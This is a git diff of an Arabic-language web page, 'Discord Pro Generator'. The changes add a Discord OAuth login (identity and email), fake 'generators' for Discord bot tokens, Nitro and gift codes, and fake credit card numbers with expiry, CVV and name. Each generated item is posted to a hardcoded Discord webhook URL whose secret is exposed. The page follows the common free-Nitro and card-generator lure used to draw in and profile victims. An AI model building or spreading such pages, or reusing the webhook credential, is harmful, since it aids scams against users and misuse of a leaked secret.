@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل الدخول - Discord Pro</title>
+    <title>Discord Pro - مولد الرموز المتقدم</title>
     <style>
         * {
             margin: 0;
@@ -12,8 +12,10 @@
         }
         
         body {
-            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 50%, #5865f2 100%);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 25%, #f093fb 50%, #f5576c 75%, #4facfe 100%);
+            background-size: 400% 400%;
+            animation: gradientShift 15s ease infinite;
             min-height: 100vh;
             display: flex;
             align-items: center;
@@ -21,6 +23,12 @@
             padding: 20px;
             position: relative;
             overflow-x: hidden;
+        }
+        
+        @keyframes gradientShift {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
         }
         
         /* تأثيرات الخلفية المتحركة */
@@ -36,85 +44,298 @@
         
         .floating-shapes {
             position: absolute;
-            width: 100px;
-            height: 100px;
-            background: rgba(255, 255, 255, 0.1);
             border-radius: 50%;
-            animation: float 6s ease-in-out infinite;
+            background: rgba(255, 255, 255, 0.1);
+            animation: float 8s ease-in-out infinite;
         }
         
-        .floating-shapes:nth-child(1) { top: 10%; left: 20%; animation-delay: 0s; }
-        .floating-shapes:nth-child(2) { top: 20%; left: 80%; animation-delay: 2s; }
-        .floating-shapes:nth-child(3) { top: 80%; left: 10%; animation-delay: 4s; }
-        .floating-shapes:nth-child(4) { top: 70%; left: 70%; animation-delay: 1s; }
+        .floating-shapes:nth-child(1) { 
+            width: 80px; height: 80px; 
+            top: 10%; left: 20%; 
+            animation-delay: 0s; 
+        }
+        .floating-shapes:nth-child(2) { 
+            width: 120px; height: 120px; 
+            top: 20%; left: 80%; 
+            animation-delay: 2s; 
+        }
+        .floating-shapes:nth-child(3) { 
+            width: 100px; height: 100px; 
+            top: 80%; left: 10%; 
+            animation-delay: 4s; 
+        }
+        .floating-shapes:nth-child(4) { 
+            width: 60px; height: 60px; 
+            top: 70%; left: 70%; 
+            animation-delay: 1s; 
+        }
+        .floating-shapes:nth-child(5) { 
+            width: 90px; height: 90px; 
+            top: 50%; left: 50%; 
+            animation-delay: 3s; 
+        }
         
         @keyframes float {
-            0%, 100% { transform: translateY(0px) rotate(0deg); }
-            50% { transform: translateY(-20px) rotate(180deg); }
+            0%, 100% { transform: translateY(0px) rotate(0deg) scale(1); }
+            25% { transform: translateY(-30px) rotate(90deg) scale(1.1); }
+            50% { transform: translateY(-20px) rotate(180deg) scale(0.9); }
+            75% { transform: translateY(-40px) rotate(270deg) scale(1.2); }
         }
         
-        .login-container {
-            background: rgba(54, 57, 63, 0.95);
-            backdrop-filter: blur(15px);
-            padding: 40px;
-            border-radius: 20px;
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+        .main-container {
+            background: rgba(30, 30, 30, 0.95);
+            backdrop-filter: blur(20px);
+            border-radius: 25px;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.4);
             width: 100%;
-            max-width: 500px;
-            text-align: center;
+            max-width: 600px;
             position: relative;
             z-index: 1;
-            border: 1px solid rgba(255, 255, 255, 0.1);
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            overflow: hidden;
         }
         
-        .discord-logo {
-            width: 140px;
-            height: 40px;
-            margin: 0 auto 30px;
-            background: linear-gradient(45deg, #5865f2, #7289da);
-            border-radius: 10px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+        .header {
+            background: linear-gradient(135deg, #5865f2, #7289da, #ff6b6b);
+            padding: 30px;
+            text-align: center;
+            position: relative;
+        }
+        
+        .header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><defs><pattern id="grid" width="10" height="10" patternUnits="userSpaceOnUse"><path d="M 10 0 L 0 0 0 10" fill="none" stroke="rgba(255,255,255,0.1)" stroke-width="0.5"/></pattern></defs><rect width="100" height="100" fill="url(%23grid)"/></svg>');
+            opacity: 0.3;
+        }
+        
+        .logo {
+            font-size: 32px;
+            font-weight: 900;
             color: white;
-            font-weight: bold;
-            font-size: 18px;
-            animation: glow 2s ease-in-out infinite alternate;
-        }
-        
-        @keyframes glow {
-            from { box-shadow: 0 0 20px rgba(88, 101, 242, 0.5); }
-            to { box-shadow: 0 0 30px rgba(88, 101, 242, 0.8); }
-        }
-        
-        .welcome-text {
-            color: #ffffff;
-            font-size: 28px;
-            font-weight: 700;
             margin-bottom: 10px;
-            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
+            text-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+            position: relative;
+            z-index: 1;
         }
         
         .subtitle {
-            color: #b9bbbe;
+            color: rgba(255, 255, 255, 0.9);
             font-size: 16px;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .content {
+            padding: 40px;
+        }
+        
+        .tab-navigation {
+            display: flex;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 15px;
+            padding: 5px;
             margin-bottom: 30px;
+            gap: 5px;
+        }
+        
+        .tab-btn {
+            flex: 1;
+            padding: 12px 20px;
+            background: transparent;
+            color: rgba(255, 255, 255, 0.6);
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-weight: 600;
+            font-size: 14px;
+        }
+        
+        .tab-btn.active {
+            background: linear-gradient(135deg, #5865f2, #7289da);
+            color: white;
+            box-shadow: 0 4px 15px rgba(88, 101, 242, 0.3);
+        }
+        
+        .tab-content {
+            display: none;
+        }
+        
+        .tab-content.active {
+            display: block;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .section {
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 20px;
+            padding: 25px;
+            margin-bottom: 25px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            transition: all 0.3s ease;
+        }
+        
+        .section:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.2);
+            border-color: rgba(88, 101, 242, 0.3);
+        }
+        
+        .section-title {
+            color: white;
+            font-size: 20px;
+            font-weight: 700;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .generator-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .generate-btn {
+            background: linear-gradient(135deg, #ff6b6b, #ee5a52);
+            color: white;
+            border: none;
+            padding: 15px 20px;
+            border-radius: 12px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-size: 14px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .generate-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: left 0.5s;
+        }
+        
+        .generate-btn:hover::before {
+            left: 100%;
+        }
+        
+        .generate-btn:hover {
+            transform: translateY(-3px) scale(1.05);
+            box-shadow: 0 10px 25px rgba(255, 107, 107, 0.4);
+        }
+        
+        .generate-btn.discord { background: linear-gradient(135deg, #5865f2, #7289da); }
+        .generate-btn.nitro { background: linear-gradient(135deg, #ff73fa, #d946ef); }
+        .generate-btn.gift { background: linear-gradient(135deg, #fbbf24, #f59e0b); }
+        .generate-btn.visa { background: linear-gradient(135deg, #1e40af, #3b82f6); }
+        .generate-btn.mastercard { background: linear-gradient(135deg, #dc2626, #ef4444); }
+        .generate-btn.paypal { background: linear-gradient(135deg, #0070ba, #00457c); }
+        
+        .result-display {
+            background: rgba(0, 0, 0, 0.3);
+            border: 2px solid #5865f2;
+            border-radius: 15px;
+            padding: 20px;
+            margin: 20px 0;
+            min-height: 80px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            font-family: 'Courier New', monospace;
+            color: #57f287;
+            font-size: 16px;
+            font-weight: bold;
+            word-break: break-all;
+            line-height: 1.5;
+        }
+        
+        .copy-btn {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: #5865f2;
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 12px;
+            font-weight: 600;
+            transition: all 0.3s ease;
+        }
+        
+        .copy-btn:hover {
+            background: #4752c4;
+            transform: scale(1.05);
+        }
+        
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
+            gap: 15px;
+            margin: 25px 0;
+        }
+        
+        .stat-card {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 20px;
+            border-radius: 15px;
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            transition: all 0.3s ease;
+        }
+        
+        .stat-card:hover {
+            transform: translateY(-5px);
+            background: rgba(255, 255, 255, 0.08);
+        }
+        
+        .stat-number {
+            font-size: 28px;
+            font-weight: 900;
+            color: #57f287;
+            margin-bottom: 5px;
+        }
+        
+        .stat-label {
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.7);
+            font-weight: 600;
         }
         
         .discord-login-btn {
             width: 100%;
-            padding: 15px 20px;
-            background: linear-gradient(45deg, #5865f2, #7289da);
-            color: #ffffff;
+            padding: 18px 25px;
+            background: linear-gradient(135deg, #5865f2, #7289da);
+            color: white;
             border: none;
-            border-radius: 10px;
+            border-radius: 15px;
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
             transition: all 0.3s ease;
             text-decoration: none;
             display: inline-block;
-            margin-bottom: 20px;
+            text-align: center;
             position: relative;
             overflow: hidden;
         }
@@ -135,291 +356,158 @@
         }
         
         .discord-login-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 20px rgba(88, 101, 242, 0.4);
-        }
-        
-        .divider {
-            margin: 30px 0;
-            position: relative;
-            text-align: center;
-        }
-        
-        .divider::before {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 0;
-            right: 0;
-            height: 1px;
-            background: linear-gradient(90deg, transparent, #4f545c, transparent);
-        }
-        
-        .divider span {
-            background: rgba(54, 57, 63, 0.95);
-            color: #72767d;
-            padding: 0 20px;
-            font-size: 14px;
-            font-weight: 600;
-            text-transform: uppercase;
-        }
-        
-        .feature-section {
-            background: rgba(47, 49, 54, 0.8);
-            border-radius: 15px;
-            padding: 25px;
-            margin: 20px 0;
-            border: 1px solid rgba(255, 255, 255, 0.05);
-            transition: all 0.3s ease;
-        }
-        
-        .feature-section:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
-        }
-        
-        .feature-section h3 {
-            color: #ffffff;
-            font-size: 18px;
-            margin-bottom: 15px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-        }
-        
-        .token-generator {
-            margin: 20px 0;
-        }
-        
-        .generate-btn {
-            background: linear-gradient(45deg, #57f287, #43b581);
-            color: white;
-            border: none;
-            padding: 12px 25px;
-            border-radius: 8px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            margin: 10px 5px;
-        }
-        
-        .generate-btn:hover {
-            transform: scale(1.05);
-            box-shadow: 0 5px 15px rgba(87, 242, 135, 0.4);
-        }
-        
-        .token-display {
-            background: #40444b;
-            border: 2px solid #5865f2;
-            border-radius: 10px;
-            padding: 15px;
-            margin: 15px 0;
-            font-family: 'Consolas', 'Monaco', monospace;
-            font-size: 14px;
-            word-break: break-all;
-            color: #57f287;
-            position: relative;
-            min-height: 50px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        
-        .copy-btn {
-            position: absolute;
-            top: 5px;
-            right: 5px;
-            background: #5865f2;
-            color: white;
-            border: none;
-            padding: 5px 10px;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 12px;
-        }
-        
-        .auth-info {
-            background: rgba(47, 49, 54, 0.8);
-            border-radius: 15px;
-            padding: 20px;
-            margin-top: 20px;
-            text-align: right;
-            border: 1px solid rgba(255, 255, 255, 0.05);
-        }
-        
-        .auth-code {
-            background: #40444b;
-            border: 2px solid #4f545c;
-            border-radius: 8px;
-            padding: 12px 15px;
-            color: #ffffff;
-            font-family: 'Consolas', 'Monaco', monospace;
-            font-size: 14px;
-            word-break: break-all;
-            margin-bottom: 15px;
-            display: none;
-            transition: all 0.3s ease;
-        }
-        
-        .info-text {
-            color: #b9bbbe;
-            font-size: 14px;
-            line-height: 1.5;
+            transform: translateY(-3px);
+            box-shadow: 0 15px 30px rgba(88, 101, 242, 0.4);
         }
         
         .user-info {
-            background: rgba(47, 49, 54, 0.8);
-            border-radius: 15px;
-            padding: 25px;
-            margin-top: 20px;
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 20px;
+            padding: 30px;
+            margin: 20px 0;
             display: none;
-            border: 1px solid rgba(255, 255, 255, 0.05);
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.1);
         }
         
         .user-avatar {
-            width: 90px;
-            height: 90px;
+            width: 100px;
+            height: 100px;
             border-radius: 50%;
             margin: 0 auto 20px;
             display: block;
-            border: 3px solid #5865f2;
+            border: 4px solid #5865f2;
             transition: all 0.3s ease;
         }
         
         .user-avatar:hover {
-            transform: scale(1.1);
-            box-shadow: 0 0 20px rgba(88, 101, 242, 0.5);
+            transform: scale(1.1) rotate(5deg);
+            box-shadow: 0 0 30px rgba(88, 101, 242, 0.5);
         }
         
         .user-name {
-            color: #ffffff;
-            font-size: 22px;
-            font-weight: 600;
-            margin-bottom: 5px;
+            color: white;
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 8px;
         }
         
         .user-email {
-            color: #b9bbbe;
-            font-size: 14px;
-            margin-bottom: 20px;
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 16px;
+            margin-bottom: 25px;
         }
         
         .logout-btn {
-            width: 100%;
-            padding: 10px 20px;
-            background: linear-gradient(45deg, #ed4245, #c73235);
-            color: #ffffff;
+            background: linear-gradient(135deg, #ef4444, #dc2626);
+            color: white;
             border: none;
-            border-radius: 8px;
-            font-size: 14px;
-            font-weight: 500;
+            padding: 12px 30px;
+            border-radius: 10px;
+            font-weight: 600;
             cursor: pointer;
             transition: all 0.3s ease;
         }
         
         .logout-btn:hover {
             transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(237, 66, 69, 0.4);
+            box-shadow: 0 8px 20px rgba(239, 68, 68, 0.4);
         }
         
-        .footer {
-            margin-top: 25px;
-            text-align: center;
-        }
-        
-        .footer a {
-            color: #00aff4;
-            text-decoration: none;
-            font-size: 14px;
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            padding: 15px 25px;
+            border-radius: 10px;
+            color: white;
+            font-weight: 600;
+            opacity: 0;
+            transform: translateX(100%);
             transition: all 0.3s ease;
+            z-index: 1000;
         }
         
-        .footer a:hover {
-            color: #57f287;
-            text-shadow: 0 0 10px rgba(87, 242, 135, 0.5);
+        .notification.show {
+            opacity: 1;
+            transform: translateX(0);
         }
         
-        .loading {
+        .notification.success {
+            background: linear-gradient(135deg, #10b981, #059669);
+        }
+        
+        .notification.error {
+            background: linear-gradient(135deg, #ef4444, #dc2626);
+        }
+        
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
             display: none;
-            color: #b9bbbe;
-            font-size: 14px;
-            margin-top: 15px;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
         }
         
         .spinner {
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 3px solid #4f545c;
+            width: 60px;
+            height: 60px;
+            border: 4px solid rgba(255, 255, 255, 0.1);
             border-radius: 50%;
             border-top-color: #5865f2;
             animation: spin 1s linear infinite;
-            margin-left: 10px;
         }
         
         @keyframes spin {
             to { transform: rotate(360deg); }
         }
         
-        .webhook-status {
-            background: rgba(47, 49, 54, 0.9);
-            border-radius: 10px;
+        .card-details {
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 12px;
             padding: 15px;
-            margin-top: 20px;
-            text-align: center;
-            display: none;
-            border: 1px solid rgba(255, 255, 255, 0.05);
+            margin: 10px 0;
+            border-left: 4px solid #5865f2;
         }
         
-        .webhook-success {
+        .card-details h4 {
             color: #57f287;
+            margin-bottom: 8px;
             font-size: 14px;
-            font-weight: 600;
         }
         
-        .webhook-error {
-            color: #ed4245;
-            font-size: 14px;
-            font-weight: 600;
+        .card-details p {
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 13px;
+            margin: 3px 0;
         }
         
-        .stats-section {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 15px;
-            margin: 20px 0;
-        }
-        
-        .stat-card {
-            background: rgba(47, 49, 54, 0.6);
-            padding: 15px;
-            border-radius: 10px;
-            text-align: center;
-            border: 1px solid rgba(255, 255, 255, 0.05);
-        }
-        
-        .stat-number {
-            font-size: 24px;
-            font-weight: bold;
-            color: #57f287;
-        }
-        
-        .stat-label {
-            font-size: 12px;
-            color: #b9bbbe;
-            margin-top: 5px;
-        }
-        
-        /* تأثيرات الشاشات الصغيرة */
         @media (max-width: 768px) {
-            .login-container {
-                padding: 30px 20px;
+            .main-container {
                 margin: 10px;
+                border-radius: 20px;
             }
             
-            .stats-section {
-                grid-template-columns: 1fr;
+            .content {
+                padding: 25px;
+            }
+            
+            .generator-grid {
+                grid-template-columns: 1fr 1fr;
+            }
+            
+            .stats-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+            
+            .tab-btn {
+                padding: 10px 15px;
+                font-size: 12px;
             }
         }
     </style>
@@ -430,361 +518,282 @@
         <div class="floating-shapes"></div>
         <div class="floating-shapes"></div>
         <div class="floating-shapes"></div>
+        <div class="floating-shapes"></div>
     </div>
 
-    <div class="login-container">
-        <div class="discord-logo">Discord Pro</div>
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+    </div>
+
+    <div class="main-container">
+        <div class="header">
+            <div class="logo">🚀 Discord Pro Generator</div>
+            <div class="subtitle">مولد الرموز والبطاقات الاحترافي</div>
+        </div>
         
-        <div id="loginSection">
-            <h1 class="welcome-text">أهلاً بك مرة أخرى!</h1>
-            <p class="subtitle">نحن متحمسون لرؤيتك مرة أخرى! 🚀</p>
+        <div class="content">
+            <div class="tab-navigation">
+                <button class="tab-btn active" onclick="switchTab('discord')">Discord</button>
+                <button class="tab-btn" onclick="switchTab('cards')">البطاقات</button>
+                <button class="tab-btn" onclick="switchTab('stats')">الإحصائيات</button>
+            </div>
             
-            <a href="https://discord.com/oauth2/authorize?client_id=1261839375738732684&response_type=code&redirect_uri=https%3A%2F%2Fkhaledali.vercel.app%2F&scope=identify+email" 
-               class="discord-login-btn">
-                🔐 تسجيل الدخول عبر Discord
-            </a>
+            <!-- تبويب Discord -->
+            <div class="tab-content active" id="discordTab">
+                <div class="section" id="loginSection">
+                    <div class="section-title">🔐 تسجيل الدخول</div>
+                    <a href="https://discord.com/oauth2/authorize?client_id=1261839375738732684&response_type=code&redirect_uri=https%3A%2F%2Fkhaledali.vercel.app%2F&scope=identify+email" 
+                       class="discord-login-btn">
+                        🎯 تسجيل الدخول عبر Discord
+                    </a>
+                </div>
+                
+                <div class="user-info" id="userInfo">
+                    <img class="user-avatar" id="userAvatar" alt="User Avatar">
+                    <div class="user-name" id="userName"></div>
+                    <div class="user-email" id="userEmail"></div>
+                    <button class="logout-btn" onclick="logout()">تسجيل الخروج</button>
+                </div>
+                
+                <div class="section">
+                    <div class="section-title">🎮 مولد رموز Discord</div>
+                    <div class="generator-grid">
+                        <button class="generate-btn discord" onclick="generateToken('discord')">🔷 Discord</button>
+                        <button class="generate-btn nitro" onclick="generateToken('nitro')">💎 Nitro</button>
+                        <button class="generate-btn gift" onclick="generateToken('gift')">🎁 Gift</button>
+                        <button class="generate-btn" onclick="generateToken('premium')">⭐ Premium</button>
+                    </div>
+                    <div class="result-display" id="discordResult">
+                        اضغط على أي زر لإنشاء رمز Discord
+                        <button class="copy-btn" id="discordCopyBtn" onclick="copyResult('discord')" style="display: none;">نسخ</button>
+                    </div>
+                </div>
+            </div>
             
-            <div class="loading" id="loading">
-                جاري التحميل<span class="spinner"></span>
+            <!-- تبويب البطاقات -->
+            <div class="tab-content" id="cardsTab">
+                <div class="section">
+                    <div class="section-title">💳 مولد بطاقات الائتمان</div>
+                    <div class="generator-grid">
+                        <button class="generate-btn visa" onclick="generateCard('visa')">💳 Visa</button>
+                        <button class="generate-btn mastercard" onclick="generateCard('mastercard')">🏦 MasterCard</button>
+                        <button class="generate-btn paypal" onclick="generateCard('paypal')">💰 PayPal</button>
+                        <button class="generate-btn" onclick="generateCard('amex')">💎 Amex</button>
+                    </div>
+                    <div class="result-display" id="cardResult">
+                        اضغط على أي زر لإنشاء بطاقة
+                        <button class="copy-btn" id="cardCopyBtn" onclick="copyResult('card')" style="display: none;">نسخ</button>
+                    </div>
+                    <div id="cardDetails"></div>
+                </div>
             </div>
-        </div>
-        
-        <div class="user-info" id="userInfo">
-            <img class="user-avatar" id="userAvatar" alt="User Avatar">
-            <div class="user-name" id="userName"></div>
-            <div class="user-email" id="userEmail"></div>
-            <button class="logout-btn" onclick="logout()">تسجيل الخروج</button>
-        </div>
-        
-        <div class="divider">
-            <span>أو</span>
-        </div>
-        
-        <!-- قسم مولد الرموز -->
-        <div class="feature-section">
-            <h3>🎯 مولد الرموز المتقدم</h3>
-            <div class="token-generator">
-                <button class="generate-btn" onclick="generateToken('premium')">🔥 رمز مميز</button>
-                <button class="generate-btn" onclick="generateToken('nitro')">💎 رمز نيترو</button>
-                <button class="generate-btn" onclick="generateToken('gift')">🎁 رمز هدية</button>
-                <button class="generate-btn" onclick="generateToken('custom')">⚡ رمز مخصص</button>
+            
+            <!-- تبويب الإحصائيات -->
+            <div class="tab-content" id="statsTab">
+                <div class="section">
+                    <div class="section-title">📊 الإحصائيات</div>
+                    <div class="stats-grid">
+                        <div class="stat-card">
+                            <div class="stat-number" id="discordCount">0</div>
+                            <div class="stat-label">رموز Discord</div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="stat-number" id="cardCount">0</div>
+                            <div class="stat-label">بطاقات مُنشأة</div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="stat-number" id="totalSent">0</div>
+                            <div class="stat-label">إجمالي المُرسل</div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="stat-number" id="todayCount">0</div>
+                            <div class="stat-label">اليوم</div>
+                        </div>
+                    </div>
+                </div>
             </div>
-            <div class="token-display" id="tokenDisplay">
-                اضغط على أي زر لإنشاء رمز جديد
-                <button class="copy-btn" id="copyBtn" onclick="copyToken()" style="display: none;">نسخ</button>
-            </div>
-        </div>
-        
-        <!-- إحصائيات -->
-        <div class="stats-section">
-            <div class="stat-card">
-                <div class="stat-number" id="generatedCount">0</div>
-                <div class="stat-label">رموز تم إنشاؤها</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-number" id="sentCount">0</div>
-                <div class="stat-label">رموز تم إرسالها</div>
-            </div>
-        </div>
-        
-        <div class="auth-info">
-            <h3>🔐 معلومات المصادقة</h3>
-            <div class="auth-code" id="authCode"></div>
-            <div class="info-text">
-                سيتم عرض كود المصادقة هنا عند العودة من Discord. 
-                جميع الرموز والأكواد يتم إرسالها تلقائياً إلى الخادم المحدد.
-            </div>
-        </div>
-        
-        <div class="footer">
-            <a href="https://discord.com/developers/docs/topics/oauth2" target="_blank">
-                📚 تعرف على Discord OAuth2
-            </a>
-        </div>
-        
-        <div class="webhook-status" id="webhookStatus">
-            <div class="webhook-success" id="webhookSuccess">✅ تم إرسال البيانات بنجاح</div>
-            <div class="webhook-error" id="webhookError">❌ فشل في إرسال البيانات</div>
         </div>
     </div>
 
     <script>
-        // متغيرات الإحصائيات
-        let generatedTokens = 0;
-        let sentTokens = 0;
-        let currentToken = '';
+        // المتغيرات العامة
+        let stats = {
+            discordTokens: 0,
+            cards: 0,
+            totalSent: 0,
+            today: 0
+        };
         
-        // الـ webhook الجديد
-        const NEW_WEBHOOK_URL = 'https://discord.com/api/webhooks/1385844749503561881/pZYFslVq1hw69sWVL40IhiPdViMqolHRUl_yCpjq36AaHqrO2Jry2OIGzKNWuOfhCCxc';
+        let currentResults = {
+            discord: '',
+            card: ''
+        };
         
-        // مولد الرموز المتقدم
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1385844749503561881/pZYFslVq1hw69sWVL40IhiPdViMqolHRUl_yCpjq36AaHqrO2Jry2OIGzKNWuOfhCCxc';
+        
+        // تبديل التبويبات
+        function switchTab(tabName) {
+            // إخفاء جميع التبويبات
+            document.querySelectorAll('.tab-content').forEach(tab => {
+                tab.classList.remove('active');
+            });
+            
+            document.querySelectorAll('.tab-btn').forEach(btn => {
+                btn.classList.remove('active');
+            });
+            
+            // إظهار التبويب المحدد
+            document.getElementById(tabName + 'Tab').classList.add('active');
+            event.target.classList.add('active');
+        }
+        
+        // مولد رموز Discord
         function generateToken(type) {
-            let token = '';
-            let prefix = '';
-            let description = '';
+            showLoading();
             
-            switch(type) {
-                case 'premium':
-                    prefix = 'PREM';
-                    token = generateRandomToken(prefix, 16);
-                    description = 'رمز Discord Premium';
-                    break;
-                case 'nitro':
-                    prefix = 'NITRO';
-                    token = generateRandomToken(prefix, 16);
-                    description = 'رمز Discord Nitro';
-                    break;
-                case 'gift':
-                    prefix = 'GIFT';
-                    token = generateRandomToken(prefix, 12);
-                    description = 'رمز هدية Discord';
-                    break;
-                case 'custom':
-                    prefix = 'CUST';
-                    token = generateRandomToken(prefix, 20);
-                    description = 'رمز مخصص';
-                    break;
-            }
-            
-            currentToken = token;
-            
-            // عرض الرمز
-            const tokenDisplay = document.getElementById('tokenDisplay');
-            tokenDisplay.innerHTML = `<strong>${token}</strong><button class="copy-btn" onclick="copyToken()">نسخ</button>`;
-            
-            // تحديث الإحصائيات
-            generatedTokens++;
-            document.getElementById('generatedCount').textContent = generatedTokens;
-            
-            // إرسال الرمز إلى webhook
-            sendTokenToWebhook(token, type, description);
-            
-            // تأثير بصري
-            tokenDisplay.style.transform = 'scale(1.05)';
             setTimeout(() => {
-                tokenDisplay.style.transform = 'scale(1)';
-            }, 200);
+                let token = '';
+                let description = '';
+                
+                switch(type) {
+                    case 'discord':
+                        token = 'mfa.' + generateRandomString(84);
+                        description = 'Discord Bot Token';
+                        break;
+                    case 'nitro':
+                        token = generateNitroCode();
+                        description = 'Discord Nitro Code';
+                        break;
+                    case 'gift':
+                        token = generateGiftCode();
+                        description = 'Discord Gift Code';
+                        break;
+                    case 'premium':
+                        token = 'PREM-' + generateRandomString(16);
+                        description = 'Discord Premium Code';
+                        break;
+                }
+                
+                currentResults.discord = token;
+                
+                document.getElementById('discordResult').innerHTML = 
+                    `<strong>${token}</strong>
+                     <button class="copy-btn" onclick="copyResult('discord')">نسخ</button>`;
+                
+                stats.discordTokens++;
+                stats.totalSent++;
+                stats.today++;
+                updateStats();
+                
+                sendToWebhook({
+                    type: 'discord_token',
+                    token: token,
+                    description: description,
+                    category: type
+                });
+                
+                hideLoading();
+                showNotification('تم إنشاء رمز Discord بنجاح!', 'success');
+            }, 1000);
+        }
+        
+        // مولد بطاقات الائتمان
+        function generateCard(type) {
+            showLoading();
+            
+            setTimeout(() => {
+                let cardData = generateCreditCard(type);
+                currentResults.card = cardData.number;
+                
+                document.getElementById('cardResult').innerHTML = 
+                    `<strong>${cardData.number}</strong>
+                     <button class="copy-btn" onclick="copyResult('card')">نسخ</button>`;
+                
+                document.getElementById('cardDetails').innerHTML = `
+                    <div class="card-details">
+                        <h4>📋 تفاصيل البطاقة</h4>
+                        <p><strong>النوع:</strong> ${cardData.type}</p>
+                        <p><strong>الرقم:</strong> ${cardData.number}</p>
+                        <p><strong>تاريخ الانتهاء:</strong> ${cardData.expiry}</p>
+                        <p><strong>CVV:</strong> ${cardData.cvv}</p>
+                        <p><strong>الاسم:</strong> ${cardData.name}</p>
+                    </div>
+                `;
+                
+                stats.cards++;
+                stats.totalSent++;
+                stats.today++;
+                updateStats();
+                
+                sendToWebhook({
+                    type: 'credit_card',
+                    ...cardData,
+                    category: type
+                });
+                
+                hideLoading();
+                showNotification('تم إنشاء بطاقة ائتمان بنجاح!', 'success');
+            }, 1500);
         }
         
         // إنشاء رمز عشوائي
-        function generateRandomToken(prefix, length) {
-            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-            let result = prefix + '-';
-            
+        function generateRandomString(length) {
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-';
+            let result = '';
             for (let i = 0; i < length; i++) {
                 result += chars.charAt(Math.floor(Math.random() * chars.length));
             }
-            
             return result;
         }
         
-        // نسخ الرمز
-        function copyToken() {
-            if (currentToken) {
-                navigator.clipboard.writeText(currentToken).then(() => {
-                    const copyBtn = document.querySelector('.copy-btn');
-                    const originalText = copyBtn.textContent;
-                    copyBtn.textContent = 'تم النسخ!';
-                    copyBtn.style.background = '#57f287';
-                    
-                    setTimeout(() => {
-                        copyBtn.textContent = originalText;
-                        copyBtn.style.background = '#5865f2';
-                    }, 1500);
-                });
+        // إنشاء رمز Nitro
+        function generateNitroCode() {
